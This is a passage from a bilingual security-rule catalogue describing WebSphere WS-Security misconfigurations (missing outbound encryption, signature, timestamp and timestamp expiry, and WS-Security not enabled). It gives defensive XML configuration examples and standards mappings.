<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Encryption"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Encryption" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Outbound Encryption"></a>WebSphere Service Provider Misconfiguration: Missing Outbound Encryption</h4><h5 id="ABSTRACT-221"><a href="#ABSTRACT-221" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未加密的消息无法保护其保密性。</p>
<h5 id="EXPLANATION-222"><a href="#EXPLANATION-222" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>SOAP 消息级加密可确保真正的端到端保密性。可通过多种传输协议发送 SOAP 消息，例如 HTTPS、HTTP、TCP、SMTP、UDP 等。无论采用哪种传输协议，消息级加密都可确保消息的保密性。Web 服务之间的常见传送情形是在各种服务之间转发 SOAP 消息，因此通过消息级加密，消息发送者和接收者均无需担忧中继点之间的传输安全问题。</p>
<h5 id="RECOMMENDATIONS-221"><a href="#RECOMMENDATIONS-221" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为对输出的消息进行加密。通过启用“响应生成器服务”配置中的保密性，便可完成此配置。</p>
<p>下面提供了 WebSphere 配置示例，将对输出的响应进行加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseGeneratorServiceConfig xmi:id=&quot;SecurityResponseGeneratorServiceConfig_1211568020342&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;confidentiality xmi:id=&quot;Confidentiality_1211571304359&quot; name=&quot;xenc&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-220"><a href="#REFERENCES-220" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Signature"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Signature" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Outbound Signature"></a>WebSphere Service Provider Misconfiguration: Missing Outbound Signature</h4><h5 id="ABSTRACT-222"><a href="#ABSTRACT-222" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>缺少签名意味着无法保证 SOAP 消息的完整性。</p>
<h5 id="EXPLANATION-223"><a href="#EXPLANATION-223" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>消息中任何未经签名的部分，都可能在发送者或接收者未察觉的情况下被截取和修改。没有签名，接收者就无法借助密码来验证消息内容来自真正的发送者。</p>
<h5 id="RECOMMENDATIONS-222"><a href="#RECOMMENDATIONS-222" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输出的消息进行签名。</p>
<p>下列服务提供程序配置可让 IBM WebSphere 验证输入请求的签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1295496768035&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseGeneratorServiceConfig xmi:id=&quot;SecurityResponseGeneratorServiceConfig_1295496768035&quot;&gt;</span><br><span class="line"></span><br><span class="line">          &lt;integrity xmi:id=&quot;Integrity_1295496768035&quot; name=&quot;int_req1&quot; order=&quot;1&quot;&gt;</span><br><span class="line"></span><br><span class="line">            &lt;messageParts xmi:id=&quot;MessageParts_1295496768037&quot; Dialect=&quot;http://www.ibm.com/websphere/webservices/wssecurity/dialect-was&quot; name=&quot;int_req_body&quot; keyword=&quot;body&quot;/&gt;</span><br><span class="line"></span><br><span class="line">          &lt;/integrity&gt;</span><br><span class="line"></span><br><span class="line">          ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-221"><a href="#REFERENCES-221" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 245</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Outbound Timestamp"></a>WebSphere Service Provider Misconfiguration: Missing Outbound Timestamp</h4><h5 id="ABSTRACT-223"><a href="#ABSTRACT-223" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-224"><a href="#EXPLANATION-224" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<h5 id="RECOMMENDATIONS-223"><a href="#RECOMMENDATIONS-223" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为在输出的响应中发送时间戳。 下列 WebSphere 配置可将时间戳添加到输出的 SOAP 响应中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;com.ibm.etools.webservice.wsext:WsExtension xmi:version=&quot;2.0&quot; xmlns:xmi=&quot;http://www.omg.org/XMI&quot; xmlns:com.ibm.etools.webservice.wsext=&quot;http://www.ibm.com/websphere/appserver/schemas/5.0.2/wsext.xmi&quot; xmi:id=&quot;WsExtension_1152150731239&quot;&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        &lt;securityResponseGeneratorServiceConfig xmi:id=&quot;SecurityResponseGeneratorServiceConfig_1211568020342&quot;&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;addTimestamp xmi:id=&quot;AddTimestamp_1211568020342&quot; expires=&quot;P3Y0M0DT4H0M0.0S&quot;/&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">&lt;/com.ibm.etools.webservice.wsext:WsExtension&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-222"><a href="#REFERENCES-222" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Missing-Timestamp-Expiration"><a href="#WebSphere-Service-Provider-Misconfiguration-Missing-Timestamp-Expiration" class="headerlink" title="WebSphere Service Provider Misconfiguration: Missing Timestamp Expiration"></a>WebSphere Service Provider Misconfiguration: Missing Timestamp Expiration</h4><h5 id="ABSTRACT-224"><a href="#ABSTRACT-224" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若 SOAP 消息含有不会到期的时间戳，则它可能容易受到 replay 攻击。</p>
<h5 id="EXPLANATION-225"><a href="#EXPLANATION-225" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>时间戳到期时，随该时间戳一同发送的任何安全语义也会随之到期。因此，没有有效期的时间戳可能会让安全语义（例如 UsernameToken 凭证）永远保持有效。</p>
<h5 id="RECOMMENDATIONS-224"><a href="#RECOMMENDATIONS-224" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>确保时间戳具有到期时间。 例如，下面的 addTimestamp 元素包含 expires 属性：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;addTimestamp xmi:id=&quot;AddTimestamp_1212094497592&quot; expires=&quot;P3Y0M0DT4H0M0.0S&quot;/&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-223"><a href="#REFERENCES-223" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security SOAP Message Security 1.1 OASIS</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="WebSphere-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled"><a href="#WebSphere-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled" class="headerlink" title="WebSphere Service Provider Misconfiguration: Outbound WS-Security Not Enabled"></a>WebSphere Service Provider Misconfiguration: Outbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-225"><a href="#ABSTRACT-225" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若服务提供程序不使用 WS-Security，则难以保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-226"><a href="#EXPLANATION-226" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的增强功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<p>若 IBM WebSphere WS-Security 服务器部署描述符扩展文件中缺少 <code>&lt;securityResponseGeneratorServiceConfig&gt;</code> 标签，则表明未启用输入消息的安全性。</p>
<h5 id="RECOMMENDATIONS-225"><a href="#RECOMMENDATIONS-225" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为使用 WS-Security。该配置应包含 <code>&lt;securityResponseGeneratorServiceConfig&gt;</code>标签以及适当的安全令牌、时间戳、签名和加密标签。</p>
<h5 id="REFERENCES-224"><a href="#REFERENCES-224" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Handbook for WebSphere Application Server 6.1 IBM Redbooks</p>
<p>[2] Web Services Security SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[4] Standards Mapping - FIPS200 CM, SC</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[17] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
